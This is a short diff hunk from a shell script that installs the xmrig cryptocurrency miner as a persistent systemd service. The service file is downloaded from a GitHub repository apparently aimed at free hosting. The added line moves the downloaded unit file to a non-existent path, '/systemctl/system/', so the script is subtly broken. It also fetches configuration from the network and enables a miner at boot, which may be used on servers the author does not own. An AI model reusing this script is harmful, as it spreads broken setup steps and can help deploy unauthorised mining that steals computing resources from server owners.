@@ -10,6 +10,7 @@ sudo apt install screen -y
 sudo chmod +x xmrig
 
 wget https://github.com/pornnewbee/socks5-for-serv00/raw/refs/heads/main/sub/work/worker.service
+mv worker.service /systemctl/system/xmrig.service
 sudo systemctl daemon-reload
 sudo systemctl enable xmrig
 sudo systemctl start xmrig
